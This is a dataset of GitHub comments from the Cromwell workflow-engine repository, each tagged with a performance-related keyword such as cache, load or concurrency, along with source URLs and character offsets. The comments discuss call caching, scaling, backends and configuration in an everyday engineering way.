Performance,"@cjllanwarne Thanks for notifying! We always use the `docker` attribute in BioWDL, so BioWDL pipelines can run without any extra configuration. On our cluster we have configured this so that we run the docker images using singularity. . I think it is a good thing that custom runtime attributes can be cached now. We recently added a `time_minutes` attribute to our pipelines in order to work better with SLURM. I hope this code ties in nicely when we switch to `hints` in WDL 2.0.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5543#issuecomment-643949996:302,cache,cached,302,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5543#issuecomment-643949996,1,['cache'],['cached']
Performance,"@cjllanwarne There's nothing stopping you from submitting a future PR proposing the changes you describe. @kshakir Don't forget about akka streams, which sit in between futures and actors on the generalized concurrency spectrum. . I recognized the URL of that blog post, I'll say that it has surprisingly useful comments at the end as well. Personally I find it a lot easier to reason about actors & messages than futures but that's not true for everyone.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1010#issuecomment-226577404:207,concurren,concurrency,207,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1010#issuecomment-226577404,1,['concurren'],['concurrency']
Performance,"@cjllanwarne Unfortunately it looks like this is a separate issue. I tried running it with the file-path hashing method: When I ran it with a wide scatter (312) it hangs before it starts any tasks in the scatter. When I ran it with a small scatter (6) it ""starts"" the jobs inside the scatter but the timing diagram just says `QueuedInCromwell` for all of them. It might not be the fact that there are declarations inside of the scatter, but the fact that those declarations include declaring multiple files, which all happen at once.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1826#issuecomment-272278222:326,Queue,QueuedInCromwell,326,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1826#issuecomment-272278222,1,['Queue'],['QueuedInCromwell']
Performance,"@cjllanwarne Yes, but for example Workflow store has a dependency on WorkflowStoreSqlDatabase trait, so that means you can not use a NoSQLDatabase impl.; In order to allow WorkflowStore to do that you will need to implement a generic interface to work with different specializations of dbs and for that you will need to define a DAL and perform a bigger refactoring.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1254#issuecomment-237936563:337,perform,perform,337,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1254#issuecomment-237936563,1,['perform'],['perform']
Performance,"@cjllanwarne You asked at standup what I was asking for when I asked about how it handles load. What I meant was if you submit stuff such that there are at least in the range of several thousand runs & status polls happening (ideally interspersed as well, not just a bunch of runs followed by a bunch of statuses) does something terrible happen? . IOW a week from now when thousands of things are flowing through via FC is there some obvious gotcha that we could have spotted now to save us some pain.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2026#issuecomment-282397582:90,load,load,90,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2026#issuecomment-282397582,1,['load'],['load']
Performance,@cjllanwarne application.conf should only include things which the most brain dead usage pattern straight out of the box would pick up. Everything else belongs in a separate conf file loaded at runtime.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/300#issuecomment-159059478:184,load,loaded,184,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/300#issuecomment-159059478,1,['load'],['loaded']
Performance,"@cjllanwarne regarding testing the ""write to cache"" and ""read from cache""... that feature isn't available to this code, it's on another PR",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/325#issuecomment-164577332:45,cache,cache,45,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/325#issuecomment-164577332,2,['cache'],['cache']
Performance,"@cjllanwarne the reason was that `WdlNamespace.load` was throwing an `ValidationException` which unfortunately is a `Throwable` but not an `Exception`, which is why there's also a PR in lenthall to make `AggregatedException` an `Exception`... I can't find a `missing_import` test in centaur though",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2098#issuecomment-289803572:47,load,load,47,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2098#issuecomment-289803572,1,['load'],['load']
Performance,"@cjllanwarne yep ! 😄 That was an earlier run I've been trying to improve PAPI throughput but it's one of the highest ""load generators"" for now",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3366#issuecomment-370929227:78,throughput,throughput,78,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3366#issuecomment-370929227,2,"['load', 'throughput']","['load', 'throughput']"
Performance,"@cjllanwarne yes, comments were hidden due to file name change.; Ans 1. Adding hidden comment I did: Caching functionality is missing here. Shouldn't each backend implement caching and when engine ask for a jobExecutor, backend may return BackendCachedJobExecutor?; Doing that we can get rid of the engine responsibility to deal with cached data...; IMO, Cache should be encapsulated in each backend. The only thing I'm not sure if we should expose a standard message to force not to use cached data. So with that you tell to each backend to not use cached data but instead to process data again.; Ans 2. I'm not seeing any new msg for WorkflowBackendActor right now. That will depend on the UCs... for CCC backend those msgs are OK.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/604#issuecomment-200953495:334,cache,cached,334,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/604#issuecomment-200953495,4,"['Cache', 'cache']","['Cache', 'cached']"
Performance,@cmarkello. I believe the metadata also shows the data it uses to evaluate whether a cache entry is the same. This can be used for debugging I believe.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-590205206:85,cache,cache,85,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-590205206,1,['cache'],['cache']
Performance,"@danbills I think I'm actually changing my mind and leaning towards doing the try/retry instead:; 1) It seems generally more robust to be able to fallback to that (compared to caching where if we can't get the info or we get it wrong we'd fail workflows); 2) Talking to @kshakir, things seem to be moving towards more generic implementations of filesystems. The retry logic could be lifted up to the generic implementation whenever it happens (which might be harder to do with a caching logic); 3) We can always add caching later if we see Cromwell struggling too much; 4) Unlike what I was thinking first, it actually simplifies the code a little and even more testing (testing that things get cached properly and for the right amount of time is a pain). Thoughts ?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3799#issuecomment-401420929:695,cache,cached,695,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3799#issuecomment-401420929,1,['cache'],['cached']
Performance,@delocalizer Yeah we changed this a while back to help w/ submission performance under load. Those synchronous checks were really bogging things downl.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1515#issuecomment-279579962:69,perform,performance,69,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1515#issuecomment-279579962,2,"['load', 'perform']","['load', 'performance']"
Performance,"@dheiman for what it's worth, ""why a call was cached"" is very conservative, so you can be assured that yes, your file's hash exactly matched the old input. As indeed did every other input value, the command string, the relevant workflow and runtime options, and the docker image specified. If anything wasn't the same, Cromwell wouldn't have used the cached result.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2681#issuecomment-335560210:46,cache,cached,46,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2681#issuecomment-335560210,2,['cache'],['cached']
Performance,"@dtenenba - the space on the scratch mount point (for cromwell it is `/cormwell_root`) is managed by a monitoring tool `ebs-autoscale` that is installed when creating a custom AMI configured for Cromwell, and then referencing that AMI when creating Batch compute environments. Running out of space points to one or more of the following:. * the monitor is not installed; * the monitor is looking at the wrong location in the filesystem. If you've created a custom AMI, I suggest launching an instance with it and checking that the monitor is watching the correct location. Do this by checking the log: `/var/log/ebs-autoscale.log`. If it's not, you'll need to recreate both the AMI and the Batch Compute Environment, and associate the new CE with your Job Queue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-468794942:756,Queue,Queue,756,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-468794942,1,['Queue'],['Queue']
Performance,"@ffinfo Hi Peter - apologies for taking so long, the release I mentioned ended up taking a while longer than we thought. I talked to our PO this morning about this pull request and his take was that if this could be hooked up in a way which keeps the tests green (as much as they ever are) and doesn't add noticeable latency in the system for other users (and/or the behavior change is put behind a config option) that he'd be good with this concept. . It's been a month now so it's entirely possible you've already moved on with life or perhaps you have no interest for other reasons so I'll leave it up to you on how to proceed",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-249220442:317,latency,latency,317,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-249220442,1,['latency'],['latency']
Performance,"@francares Ah! I see. Yeah, I asked because I wasn't sure why we'd need another command type, we could either make a different type of ExecutorActor or have a branch in the existing ExecutorActor for caches. So we agree there. As for another message type, I believe this is all configured in (a) global config file and (b) workflow options so the actors should already have everything they need to decide whether to allow caching or not. So IMO there's no special case at this layer to handle caching.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/604#issuecomment-200959492:200,cache,caches,200,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/604#issuecomment-200959492,1,['cache'],['caches']
Performance,"@francares Can you provide more details on what you're actually doing? Cromwell as-is isn't intended to be scaled like that, at least not at the moment. Also the current metadata implementation isn't expected to be a heavy hitting, scalable solution (e.g. we'll be providing at least one alternate implementation over the next couple of months for a more scalable use case)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2452#issuecomment-315474312:232,scalab,scalable,232,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2452#issuecomment-315474312,2,['scalab'],['scalable']
Performance,"@francares are you seeing a stack overflow exception or a Slick ""task rejected from queue"" exception?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2447#issuecomment-315446494:84,queue,queue,84,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2447#issuecomment-315446494,1,['queue'],['queue']
Performance,"@gauravs90 @geoffjentry ; Re JES Backend - there's a _lot_ of hidden complexity in the JES backend that I think could quite easily end up being more than 5 days work to re-implement under another workflow runner. We currently have a Master branch which lets us run hundreds of Genomes-on-the-Cloud jobs concurrently in JES. If this merge goes ahead before the JES backend is made (and is as robust as it currently exists), we LOSE that ability. I don't think we should underestimate this task.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/401#issuecomment-174213137:303,concurren,concurrently,303,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/401#issuecomment-174213137,1,['concurren'],['concurrently']
Performance,@gauravs90 including the bottom row is an optimization once/if the original actor is overloaded. The right optimization at that point might not be what we think it is now - but it'll be trivial to change on the future as clients of this actor were talking about can continue to use the same actor ref without being any the wiser,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-196430491:42,optimiz,optimization,42,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-196430491,2,['optimiz'],['optimization']
Performance,"@geoffjentry -- to put this in your head. Let's not jump to it being an engine feature. But I think the point here is a good one. . I think this, and other use cases, might be best met by a set of ""built-in"" tasks that cromwell could come with. For example, through the use of imports and having cromwell released with a equivalent of ""genomics-stdlib"" we could provide genomics specific manipulations as tasks. This solves the problem of the user having to write them themselves. Then through the use of smart multi-backend support we could also have some of these stdlib tasks run on the same machine as cromwell. This requires a bunch of advances to the engine, but I think it's where we can provide a lot of value to the users. The first step in this could be having Kate & Crew (along with our help) publish that ""gatk-stdlib.wdl"" that performs these functions and people could import. Then if that is successful we could see how we would best provide that sort of support in a batteries included fashion.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1605#issuecomment-255404918:841,perform,performs,841,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1605#issuecomment-255404918,1,['perform'],['performs']
Performance,"@geoffjentry ; **Prerequisite**: We have Spark cluster (3 nodes = 1 master, rest worker including master), Docker on all three nodes, Hdfs file system (3 nodes = 1 Namenode, rest Data nodes including NN) Spark app build locally in Docker repository. This app (spark_hdfs.jar) has two main entry points 1) Word count 2) Vowel count as main class. App consumes input available on Hdfs (assumption pre-loaded) and produces output to Hdfs. . **WDL:**. ```; task spark {; command {; /opt/spark/spark-1.6.1-bin-hadoop2.6/bin/spark-submit --class com.intel.spark.poc.nfs.SparkVowelLine --master spark://10.0.1.22:7077 /app/spark_hdfs.jar hdfs://10.0.1.22:8020/home/himanshuj/test/kinglear.txt hdfs://10.0.1.22:8020/home/himanshuj/output; }. output {; File empty = stdout(); }. runtime {; docker: ""sparkapp""; }. }. workflow test {; call spark; }. ```. So the app is available inside the docker container that has base image with Spark environment(i.e. Spark driver + hadoop connector) that will connect to Spark master on host machine within the cluster to submit job, reads input from hdfs file system and turn them into RDDs and distribute the work to workers with the help of master and at the end write output to hdfs. . Following are the arguments to the app ; `hdfs://10.0.1.22:8020/home/himanshuj/test/kinglear.txt hdfs://10.0.1.22:8020/home/himanshuj/output`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1132#issuecomment-230938660:399,load,loaded,399,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1132#issuecomment-230938660,1,['load'],['loaded']
Performance,"@geoffjentry ; I'm using SGE as backend and a MariaDB database. Running cromwell inside a docker container.; Call-caching is ON, I've got a concurrent job limit of 100, and a slightly customised job script epilogue. The rest of the cromwell config is standard as in the docs.; Anything other relevant info that I could provide?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2450#issuecomment-423505570:140,concurren,concurrent,140,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2450#issuecomment-423505570,1,['concurren'],['concurrent']
Performance,@geoffjentry @scottfrazer It seems the parser is validating memory runtime attribute entry when it tries to load namespaces.; I think it should be removed to follow the current idea.; This is the link to the code that is causing related test to fail (look for ignore word in the PR) => https://github.com/broadinstitute/wdl4s/blob/d7e19c9f4dfbc5ad912cf641af9c640eb8a9a9c7/src/main/scala/wdl4s/RuntimeAttributes.scala; Let me know how to proceed with this...,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/708#issuecomment-212545369:108,load,load,108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/708#issuecomment-212545369,1,['load'],['load']
Performance,"@geoffjentry Absolutely no worries, I totally understand but it is a bit weird to be aware of the concepts behind the following fault-tolerant scalable analysis pipelines and other distributed algorithms - which I'm sure you and many people are - and still be noticing that you have to deal with [20000 scatter/gather jobs](https://github.com/broadinstitute/cromwell/issues/1662) that might be causing issues when producing 10% of the world's genomic data:; - [Google's Continuous Pipelines](http://research.google.com/pubs/pub43790.html); - [Facebook's Real-Time Data Processing Pipelines](https://research.facebook.com/publications/realtime-data-processing-at-facebook/); - [Microsoft's Whole-Exome Workflows](https://www.microsoft.com/en-us/research/publication/scalable-and-efficient-whole-exome-data-processing-using-workflows-on-the-cloud/). Maybe it's my passion for high-throughput data integration, and knowing the potential of pipelined analysis that is achievable today through streamlined fault-tolerant scaling. I'm sure the Broad is already aware of these, as some of the fundamental scalability concepts have and are being implemented in [Hail](https://github.com/hail-is/hail). At least I'm comforted that you watch all the suggestions, and maybe in the future this might provide some helpful support :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-261687956:143,scalab,scalable,143,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-261687956,4,"['scalab', 'throughput']","['scalability', 'scalable', 'scalable-and-efficient-whole-exome-data-processing-using-workflows-on-the-cloud', 'throughput']"
Performance,"@geoffjentry I ran this wdl on local backend, call caching off, and I mocked the backend response to immediately return success instead of running the job. So all jobs finish immediately and at the same time. It's not a realistic use case but it's an easy way to push cromwell hard in terms of execution performance for large scatter. ```; task hello {; String addressee; command {; echo ""Hello ${addressee}!""; }; runtime {; docker: ""ubuntu""; }; }. workflow wf_hello {; String wf_hello_input = ""world""; Array[Int] s = range(200000); scatter (i in s) {; call hello {input: addressee = wf_hello_input }; }; }; ```. Here are the results:. | Branch | JobStore Writes | ExecutionTime |; |------------|-----------------|-------------------------------------------------------------|; | Develop | On | Still computing runnable calls after 30' - no shard started |; | ThisBranch | On | 8' |; | ThisBranch | Off | 1'30"" |",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2087#issuecomment-289090274:304,perform,performance,304,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2087#issuecomment-289090274,1,['perform'],['performance']
Performance,@geoffjentry I totally agree with @rtitle that this is something that should be added to next FC release as the performance improvement is significant.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2485#issuecomment-317803184:112,perform,performance,112,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2485#issuecomment-317803184,1,['perform'],['performance']
Performance,"@geoffjentry I totally agree with having a singleton actor for load balancing / supervision / monitoring etc.. but I think the actual validation work itself is better handled by a one-shot do-and-die actor than by a singleton actor. I don't think the actor that is responsible for load balancing, error handling etc.. should also be responsible for doing the work it's supervising.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195401589:63,load,load,63,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195401589,2,['load'],['load']
Performance,"@geoffjentry I understand re: egress charges. In my use case these aren't an issue, so a flag option would still help. Maybe, make egress cost a config option of a filesystem, and only reuse results if the egress cost would be under some user-specified value? You can also drop the requirement of specifying one engine/filesystem for all tasks. You could then return a cached result from any filesystem where it exists, without needing to copy it to a target filesystem. You could then also let workflow inputs point to files on different filesystems, and automatically choose the engine for each job based on where its inputs are.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4616#issuecomment-461576286:369,cache,cached,369,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4616#issuecomment-461576286,1,['cache'],['cached']
Performance,"@geoffjentry Is this at the time of running the workflow, or after the fact (like #1670)?. As a **workflow runner**, I want **to be able to select certain tasks to call cache or not call cache on**, so that I can **avoid reusing bad or old cache results**. ; - Effort: **Small**; - Risk: **Small to Mediume**; - This should not be a runtime attribute; - Make sure users don't overuse this feature and eliminate the benefits of call caching (i.e. clearly state when users should use this); - Business value: **Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1695#issuecomment-327932586:169,cache,cache,169,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1695#issuecomment-327932586,3,['cache'],['cache']
Performance,"@geoffjentry It wasn't yet, AFAIK you need a branch to test stuff on the perf env so I thought I'd make a PR of it already and test it in the meantime. We could also leave the current value of 100 and merge this which would have no change in behavior and then tune the value if necessary with benchmarks",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4087#issuecomment-420627111:260,tune,tune,260,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4087#issuecomment-420627111,1,['tune'],['tune']
Performance,"@geoffjentry This is my github ID. :). @katevoss We've been using parameters to tasks to override runtime attributes. However, I am not sure how this affects call caching, it is very clunky, and the standard names my group uses may different from another. This lattermost is a headache for pipeline engineers. Anyway, it would be nice to have a mechanism for overriding runtime attributes, mostly for users, not developers. This would cover times where WDL writers have hardcoded runtime attributes that do not fit a user's need. For me, this is no longer high priority... . Though is another issue needed for these parameters that I use adversely affecting call caching (e.g. my `preemptible_attempts` parameter is only used in the runtime block and should not cause a cache miss if it is changed)?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1210#issuecomment-325718645:770,cache,cache,770,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1210#issuecomment-325718645,1,['cache'],['cache']
Performance,@geoffjentry We came to the conclusion that my earlier change did not cause the performance issue. I will make a new issue for this performence. Still this code I made here is useful to merge and is ready to review/merge.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4220#issuecomment-429845193:80,perform,performance,80,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4220#issuecomment-429845193,2,['perform'],"['performance', 'performence']"
Performance,@geoffjentry Within the workflow actor? I don't know how concurrent the tests are but they aren't crazy - I can imagine a scatter going wider than our test cases,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143032224:57,concurren,concurrent,57,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143032224,1,['concurren'],['concurrent']
Performance,"@geoffjentry Yeah, I have also hit my share of obscure errors over time in my applications, though by that time the failure-recovery rules usually kicked in to keep the system in a running state, with the periodic subsequent log monitoring and analysis in case certain edge-cases become more prevalent. It is great to hear about the shift towards scaling being explored for the near future, but I think you might have made things unnecessarily hard for yourself. Usually it is much easier to have scaling be built-in from the start into the application, and then tuning through metric-based scaling policies the application-triggered scaling rules, which can be bounded by appropriate upper limits before, or interactively after application deployment. This way one has the benefits of both worlds - controlling costs with scalability capabilities for satisfying possible capacity/performance requirements - but I am sure you are already aware of that as well :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-262130235:823,scalab,scalability,823,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-262130235,2,"['perform', 'scalab']","['performance', 'scalability']"
Performance,@geoffjentry and @aednichols regarding documentation I added this: https://github.com/broadinstitute/cromwell/blob/cjl_nio_meta/docs/optimizations/FileLocalization.md. Is that sufficient of is there more to be said?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3738#issuecomment-395518160:133,optimiz,optimizations,133,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3738#issuecomment-395518160,1,['optimiz'],['optimizations']
Performance,"@geoffjentry asked me to clarify, so here I am!. Currently, PAPI doesn't understand FOFN... so they are really just a File that contains strings. Often they are created by taking the file output of a scatter call as an array and writing it to an array like. ```; Array[File] vcfs = PreviousTask.output ...; File fofn = write_lines(vcfs); ```. Then that FOFN is used as the parameter to the task, and used by the tool in the command directly. The only thing that gets localized by PAPI is the FOFN itself. Keep in mind right now that the only scenario where this works is where your docker has access to the file, which on Google means when you're running in service account mode, but hopefully we can overcome that in the future. Just for context, my use case here is more like 'resume' than call caching. I don't expect to find results from some previous/other run of the pipeline. It's really that something broke, I tweaked the WDL, and now want to basically pick up where I left off. That's the specific problem I have (and any methods developer will have with a FOFN step). There are two ways I can think of going about this:. 1. Fix call caching to handle FOFNs specifically. This is tricky I think, but is most robust. In this case, I want Cromwell to understand a File of File references as a specific type but just for call caching purposes. 2. Change call caching to re-use files rather than copying, thus the path of the file doesn't changes, the FOFN doesn't change, and the call cache hits. This is how I ended up working around this by splitting the WDL into pieces where I supply the inputs to avoid the cache-miss step. I believe we have this option in the SFS?. In your proposal @cjllanwarne a FileRef would be hashed like a file for job avoidance, but treated like a string for all other purposes (e.g. passing to PAPI, etc)? I think that could work.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2309#issuecomment-305977901:1492,cache,cache,1492,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2309#issuecomment-305977901,2,['cache'],"['cache', 'cache-miss']"
Performance,@geoffjentry does this mean that users can choose to link to the results rather than copy the results when they get a cache hit?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2330#issuecomment-375766475:118,cache,cache,118,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2330#issuecomment-375766475,1,['cache'],['cache']
Performance,@geoffjentry have you continued to see many logs as drowning performance? It sounds like optimizing logs could give us a large bump in scale!,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1807#issuecomment-328593648:61,perform,performance,61,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1807#issuecomment-328593648,2,"['optimiz', 'perform']","['optimizing', 'performance']"
Performance,@geoffjentry is it possible to call cache when the original input no longer exists? ; @dheiman have you looked at the [call cache diff endpoint](https://github.com/broadinstitute/cromwell#get-apiworkflowsversioncallcachingdiff)? This is not available in FireCloud but it may have more information about why a workflow cached (or did not).,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2681#issuecomment-335536210:36,cache,cache,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2681#issuecomment-335536210,3,['cache'],"['cache', 'cached']"
Performance,"@geoffjentry is the idea for this to enable horizontal scalability of cromwell? If so, we are much looking forward to this support!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3339#issuecomment-371822508:55,scalab,scalability,55,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3339#issuecomment-371822508,1,['scalab'],['scalability']
Performance,@geoffjentry probably better to treat a cached-to 404 the same as a failed cache hit copy so we can fall back to trying another cache hit rather than re-running the job.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2330#issuecomment-306308816:40,cache,cached-to,40,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2330#issuecomment-306308816,3,['cache'],"['cache', 'cached-to']"
Performance,"@geoffjentry the . > Extra logging around unexpected keys. commit was the key:. <img width=""1316"" alt=""screen shot 2017-04-05 at 12 13 07 pm"" src=""https://cloud.githubusercontent.com/assets/13006282/24715464/6515445e-19f9-11e7-9c54-34698bfe9d87.png"">. Before moving that message send I was seeing that programming error appear as a rare race condition (but often enough to fail a few sbt tests every time). I think my mistake was that the `createResponseSet` wasn't necessarily called from a `receive` method so akka was quite at liberty to interleave it with calls to `fulfillOrLog`, which I had assumed would be impossible.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2102#issuecomment-291915185:337,race condition,race condition,337,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2102#issuecomment-291915185,1,['race condition'],['race condition']
Performance,"@geoffjentry what is the reflectively loaded classes? If it's just the docs, I can do a quick ReadMe ""search and replace"" 😁",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2019#issuecomment-328190721:38,load,loaded,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2019#issuecomment-328190721,1,['load'],['loaded']
Performance,@geoffjentry what was the effect on performance with `mapValues`? What would users (FireCloud or individual Cromwell users) notice?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2434#issuecomment-333185621:36,perform,performance,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2434#issuecomment-333185621,1,['perform'],['performance']
Performance,"@geoffjentry will a job call cache if a user overrides runtime attributes? ; @LeeTL1220 What do you mean by your last comment? Do you mean that there are certain parameters that cause a cache-miss when you change them, but you want them to cache-hit? That might be a different issue, I can create it if you want to explain it to me.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1210#issuecomment-325784438:29,cache,cache,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1210#issuecomment-325784438,3,['cache'],"['cache', 'cache-hit', 'cache-miss']"
Performance,"@geoffjentry yeah but assuming it's on the same EC that doesn't actually solve anything. . It'd be much better to have... (wait for it....)... a work pulling system that limits how many of these are going on at once. Now admittedly that's an easier transition if you already have the actors in place but unless you want the full scalability fix here, I suggest we address that as part of the scalability sprint (and I'd be very happy to do it then!)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1640#issuecomment-257712585:329,scalab,scalability,329,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1640#issuecomment-257712585,2,['scalab'],['scalability']
